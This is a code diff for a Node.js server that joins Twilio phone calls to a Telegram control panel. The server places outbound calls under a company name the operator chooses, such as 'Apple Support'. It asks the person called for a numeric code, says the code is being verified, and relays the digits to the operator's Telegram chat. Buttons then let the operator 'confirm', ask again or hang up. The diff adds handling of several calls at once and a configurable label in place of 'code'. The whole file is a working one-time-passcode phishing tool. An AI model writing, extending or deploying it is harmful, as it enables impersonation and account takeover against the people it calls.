@@ -25,7 +25,8 @@ const client = twilio(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN);
 let settings = {
   company: "Support",
   digits: 6,
-  assistant: 0
+  assistant: 0,
+  itemName: "reference number"
 };
 
 const assistants = [
@@ -38,37 +39,47 @@ const assistants = [
 ];
 
 // ===== STATE =====
-let activeCallSid = null;
-let activeCaller = null;
-let activeCode = null;
-let callStart = null;
-let callStatus = "Idle";
+// calls keyed by CallSid
+const calls = new Map();
 let lastCaller = null;
-
 let logs = [];
 let panelMessageId = null;
-let pendingInput = null; // "call", "company", "digits", "assistant"
+let pendingInput = null; // "call", "company", "digits", "assistant", "item"
 
-// ===== HELPERS =====
 function assistant() {
   return assistants[settings.assistant] || assistants[0];
 }
 
 function pushLog(text) {
   logs.unshift(`${new Date().toLocaleTimeString()} ${text}`);
-  logs = logs.slice(0, 10);
+  logs = logs.slice(0, 20);
 }
 
-function currentSeconds() {
-  if (!callStart) return 0;
-  return Math.floor((Date.now() - callStart) / 1000);
+function getOrCreateCall(callSid) {
+  if (!callSid) return null;
+  if (!calls.has(callSid)) {
+    calls.set(callSid, {
+      sid: callSid,
+      caller: null,
+      input: null,
+      startedAt: Date.now(),
+      status: "Idle",
+      assistantIndex: settings.assistant
+    });
+  }
+  return calls.get(callSid);
 }
 
-function currentTimerText() {
-  const secs = currentSeconds();
-  const mm = String(Math.floor(secs / 60)).padStart(2, "0");
-  const ss = String(secs % 60).padStart(2, "0");
+function callTimerText(call) {
+  if (!call || !call.startedAt) return "00:00";
+  const total = Math.floor((Date.now() - call.startedAt) / 1000);
+  const mm = String(Math.floor(total / 60)).padStart(2, "0");
+  const ss = String(total % 60).padStart(2, "0");
   return `${mm}:${ss}`;
+}
+
+function sortedCalls() {
+  return Array.from(calls.values()).sort((a, b) => (b.startedAt || 0) - (a.startedAt || 0));
 }
 
 // ===== TELEGRAM =====
@@ -86,11 +97,7 @@ async function tgSend(text, buttons = null) {
     chat_id: CHAT_ID,
     text
   };
-
-  if (buttons) {
-    body.reply_markup = { inline_keyboard: buttons };
-  }
-
+  if (buttons) body.reply_markup = { inline_keyboard: buttons };
   return tg("sendMessage", body);
 }
 
@@ -100,11 +107,7 @@ async function tgEdit(messageId, text, buttons = null) {
     message_id: messageId,
     text
   };
-
-  if (buttons) {
-    body.reply_markup = { inline_keyboard: buttons };
-  }
-
+  if (buttons) body.reply_markup = { inline_keyboard: buttons };
   return tg("editMessageText", body);
 }
 
@@ -139,37 +142,28 @@ function panelButtons() {
 }
 
 function panelText() {
-  let statusBlock = "No active call";
+  const active = sortedCalls().slice(0, 6);
 
-  if (callStatus === "Ringing") {
-    statusBlock = `📞 Ringing
-Number: ${activeCaller || "Unknown"}
-Time: ${currentTimerText()}`;
+  let lines = ["📞 LIVE CALLS", ""];
+
+  if (!active.length) {
+    lines.push("No active calls");
+  } else {
+    active.forEach((call, index) => {
+      lines.push(`${index + 1}) ${call.status}`);
+      lines.push(`Caller: ${call.caller || "Unknown"}`);
+      lines.push(`${settings.itemName}: ${call.input || "waiting"}`);
+      lines.push(`Time: ${callTimerText(call)}`);
+      lines.push("");
+    });
   }
 
-  if (callStatus === "Answered") {
-    statusBlock = `✅ Answered
-Number: ${activeCaller || "Unknown"}
-Time: ${currentTimerText()}
-Code: ${activeCode || "waiting"}`;
-  }
+  lines.push(`Company: ${settings.company}`);
+  lines.push(`Digits: ${settings.digits}`);
+  lines.push(`Assistant: ${assistant().name}`);
+  lines.push(`Item: ${settings.itemName}`);
 
-  if (callStatus === "Ended") {
-    statusBlock = `❌ Call Ended
-Number: ${activeCaller || "Unknown"}`;
-  }
-
-  if (callStatus === "Idle") {
-    statusBlock = "No active call";
-  }
-
-  return `📞 IVR Control Panel
-
-${statusBlock}
-
-Company: ${settings.company}
-Digits: ${settings.digits}
-Assistant: ${assistant().name}`;
+  return lines.join("\n");
 }
 
 async function updatePanel(forceNew = false) {
@@ -186,9 +180,7 @@ async function updatePanel(forceNew = false) {
     }
 
     await tgEdit(panelMessageId, text, buttons);
-  } catch {
-    // ignore edit noise / temporary Telegram issues
-  }
+  } catch {}
 }
 
 // ===== TWILIO CALL CONTROL =====
@@ -207,14 +199,19 @@ async function startCall(number) {
   pushLog(`Outbound call started to ${number}`);
 }
 
-async function updateLiveCallTwiml(twiml) {
-  if (!activeCallSid) return;
-  await client.calls(activeCallSid).update({ twiml });
+function newestActiveCall() {
+  const active = sortedCalls().find(c => c.status !== "Ended");
+  return active || null;
 }
 
-async function endLiveCallImmediately() {
-  if (!activeCallSid) return;
-  await client.calls(activeCallSid).update({
+async function updateLiveCallTwiml(callSid, twiml) {
+  if (!callSid) return;
+  await client.calls(callSid).update({ twiml });
+}
+
+async function endLiveCallImmediately(callSid) {
+  if (!callSid) return;
+  await client.calls(callSid).update({
     twiml: `<Response><Hangup/></Response>`
   });
 }
@@ -224,7 +221,6 @@ app.get("/", (req, res) => {
   res.send("Server running");
 });
 
-// Optional browser test route
 app.get("/ivr", (req, res) => {
   res.type("text/xml");
   res.send(`<Response><Say>IVR endpoint is working.</Say></Response>`);
@@ -237,26 +233,26 @@ app.post("/call-status", async (req, res) => {
     const from = req.body.From;
     const sid = req.body.CallSid;
 
-    if (from) activeCaller = from;
-    if (sid) activeCallSid = sid;
+    const call = getOrCreateCall(sid);
+    if (call) {
+      if (from) call.caller = from;
 
-    if (status === "ringing") {
-      callStatus = "Ringing";
-      if (!callStart) callStart = Date.now();
+      if (status === "ringing") {
+        call.status = "Ringing";
+        if (!call.startedAt) call.startedAt = Date.now();
+      }
+
+      if (status === "in-progress" || status === "answered") {
+        call.status = "Answered";
+        if (!call.startedAt) call.startedAt = Date.now();
+      }
+
+      if (status === "completed") {
+        call.status = "Ended";
+      }
+
+      updatePanel();
     }
-
-    if (status === "in-progress" || status === "answered") {
-      callStatus = "Answered";
-      if (!callStart) callStart = Date.now();
-    }
-
-    if (status === "completed") {
-      callStatus = "Ended";
-      activeCallSid = null;
-      activeCode = null;
-    }
-
-    updatePanel();
   } catch (e) {
     console.log("call-status error:", e.message);
   }
@@ -267,22 +263,28 @@ app.post("/call-status", async (req, res) => {
 // ===== IVR START =====
 app.post("/ivr", async (req, res) => {
   try {
-    activeCaller = req.body.From || activeCaller;
-    activeCallSid = req.body.CallSid || activeCallSid;
-    lastCaller = req.body.From || lastCaller;
+    const sid = req.body.CallSid;
+    const from = req.body.From;
 
-    if (!callStart) callStart = Date.now();
-    callStatus = "Answered";
+    const call = getOrCreateCall(sid);
+    if (call) {
+      call.caller = from || call.caller;
+      call.assistantIndex = settings.assistant;
+      call.status = "Answered";
+      if (!call.startedAt) call.startedAt = Date.now();
+    }
 
+    lastCaller = from || lastCaller;
     updatePanel();
 
     res.type("text/xml");
     res.send(`
 <Response>
 <Say voice="${assistant().voice}">
-Hello from ${settings.company}. Please enter your ${settings.digits} digit code.
+Hello from ${settings.company}. Please enter your ${settings.digits} digit ${settings.itemName}.
 </Say>
-<Gather numDigits="${settings.digits}" action="${BASE_URL}/code" method="POST" timeout="8"/>
+<Gather numDigits="${settings.digits}" action="${BASE_URL}/input" method="POST" timeout="8"/>
+<Redirect method="POST">${BASE_URL}/ivr</Redirect>
 </Response>
 `);
   } catch (e) {
@@ -292,47 +294,47 @@ Hello from ${settings.company}. Please enter your ${settings.digits} digit code.
   }
 });
 
-// ===== CODE RECEIVED =====
-app.post("/code", async (req, res) => {
+// ===== INPUT RECEIVED =====
+app.post("/input", async (req, res) => {
   try {
     const digits = req.body.Digits;
     const caller = req.body.From;
     const sid = req.body.CallSid;
 
-    activeCallSid = sid;
-    activeCaller = caller;
-    activeCode = digits;
-    callStatus = "Answered";
-    callStart = Date.now();
-    lastCaller = caller;
+    const call = getOrCreateCall(sid);
+    if (call) {
+      call.caller = caller;
+      call.input = digits;
+      call.status = "Answered";
+      call.startedAt = Date.now();
+    }
 
+    lastCaller = caller;
     pushLog(`${caller} : ${digits}`);
 
-    // respond to caller first
     res.type("text/xml");
     res.send(`
 <Response>
 <Say voice="${assistant().voice}">
-Please wait while we verify your code.
+Please wait while we review your ${settings.itemName}.
 </Say>
 <Redirect method="POST">${BASE_URL}/hold</Redirect>
 </Response>
 `);
 
-    // telegram afterwards
     setTimeout(async () => {
       try {
-        await tgSend(`📞 CODE RECEIVED
+        await tgSend(`📞 INPUT RECEIVED
 
 Caller: ${caller}
-Code: ${digits}`);
+${settings.itemName}: ${digits}`);
         await updatePanel();
       } catch (e) {
-        console.log("post-code telegram error:", e.message);
+        console.log("post-input telegram error:", e.message);
       }
     }, 0);
   } catch (e) {
-    console.log("/code error:", e.message);
+    console.log("/input error:", e.message);
     res.type("text/xml");
     res.send(`<Response><Say>Application error.</Say></Response>`);
   }
@@ -354,52 +356,53 @@ app.post("/telegram", async (req, res) => {
   const update = req.body;
 
   try {
-    // ===== BUTTONS =====
     if (update.callback_query) {
       const action = update.callback_query.data;
       const callbackId = update.callback_query.id;
+      const call = newestActiveCall();
+      const callSid = call ? call.sid : null;
 
       if (action === "confirm") {
-        await updateLiveCallTwiml(`
+        if (callSid) {
+          await updateLiveCallTwiml(callSid, `
 <Response>
 <Say voice="${assistant().voice}">
-Thank you. Your code has been confirmed. Have a great day.
+Thank you. Your ${settings.itemName} has been confirmed. Have a great day.
 </Say>
 <Hangup/>
 </Response>
 `);
-        pushLog("Confirmed");
-        callStatus = "Ended";
-        activeCallSid = null;
-        activeCode = null;
-        callStart = null;
-        await updatePanel();
+          call.status = "Ended";
+          pushLog("Confirmed");
+          await updatePanel();
+        }
         await tgAnswerCallback(callbackId, "Confirmed");
       }
 
       if (action === "retry") {
-        await updateLiveCallTwiml(`
+        if (callSid) {
+          await updateLiveCallTwiml(callSid, `
 <Response>
 <Say voice="${assistant().voice}">
-Please re-enter your code.
+Please re-enter your ${settings.itemName}.
 </Say>
-<Gather numDigits="${settings.digits}" action="${BASE_URL}/code" method="POST" timeout="8"/>
+<Gather numDigits="${settings.digits}" action="${BASE_URL}/input" method="POST" timeout="8"/>
 </Response>
 `);
-        pushLog("Retry requested");
-        activeCode = null;
-        await updatePanel();
+          call.input = null;
+          pushLog("Retry requested");
+          await updatePanel();
+        }
         await tgAnswerCallback(callbackId, "Retry sent");
       }
 
       if (action === "hangup") {
-        await endLiveCallImmediately();
-        pushLog("Hung up");
-        callStatus = "Ended";
-        activeCallSid = null;
-        activeCode = null;
-        callStart = null;
-        await updatePanel();
+        if (callSid) {
+          await endLiveCallImmediately(callSid);
+          call.status = "Ended";
+          pushLog("Hung up");
+          await updatePanel();
+        }
         await tgAnswerCallback(callbackId, "Hung up");
       }
 
@@ -434,7 +437,6 @@ Please re-enter your code.
       }
     }
 
-    // ===== COMMANDS =====
     if (update.message && update.message.text) {
       const text = update.message.text.trim();
 
@@ -442,6 +444,48 @@ Please re-enter your code.
         pendingInput = null;
         await startCall(text);
         await tgSend(`📞 Calling ${text}`);
+        return res.sendStatus(200);
+      }
+
+      if (pendingInput === "company" && !text.startsWith("/")) {
+        pendingInput = null;
+        settings.company = text;
+        await tgSend(`🏢 Company set to ${settings.company}`);
+        await updatePanel();
+        return res.sendStatus(200);
+      }
+
+      if (pendingInput === "digits" && !text.startsWith("/")) {
+        pendingInput = null;
+        const d = parseInt(text, 10);
+        if (d >= 2 && d <= 10) {
+          settings.digits = d;
+          await tgSend(`✅ ${d} digits set`);
+          await updatePanel();
+        } else {
+          await tgSend("Use a number from 2 to 10");
+        }
+        return res.sendStatus(200);
+      }
+
+      if (pendingInput === "assistant" && !text.startsWith("/")) {
+        pendingInput = null;
+        const a = parseInt(text, 10);
+        if (a >= 1 && a <= assistants.length) {
+          settings.assistant = a - 1;
+          await tgSend(`🎙 ${assistant().name} assistant set`);
+          await updatePanel();
+        } else {
+          await tgSend("Use a number from 1 to 6");
+        }
+        return res.sendStatus(200);
+      }
+
+      if (pendingInput === "item" && !text.startsWith("/")) {
+        pendingInput = null;
+        settings.itemName = text;
+        await tgSend(`📝 Item set to ${settings.itemName}`);
+        await updatePanel();
         return res.sendStatus(200);
       }
 
@@ -462,6 +506,7 @@ Please re-enter your code.
 /digits 6 - set digits
 /assistant 2 - set assistant
 /company Apple Support - set company
+/item booking code - set input label
 /settings - show current settings
 /commands - show command list`);
       }
@@ -471,7 +516,8 @@ Please re-enter your code.
 
 Company: ${settings.company}
 Digits: ${settings.digits}
-Assistant: ${assistant().name}`);
+Assistant: ${assistant().name}
+Item: ${settings.itemName}`);
       }
 
       if (text === "/commands") {
@@ -486,6 +532,7 @@ Assistant: ${assistant().name}`);
 /digits X
 /assistant X
 /company NAME
+/item NAME
 /help
 /settings`);
       }
@@ -538,6 +585,17 @@ Assistant: ${assistant().name}`);
         } else {
           settings.company = name;
           await tgSend(`🏢 Company set to ${settings.company}`);
+          await updatePanel();
+        }
+      }
+
+      if (text.startsWith("/item")) {
+        const name = text.replace("/item", "").trim();
+        if (!name) {
+          await tgSend("Usage: /item booking code");
+        } else {
+          settings.itemName = name;
+          await tgSend(`📝 Item set to ${settings.itemName}`);
           await updatePanel();
         }
       }
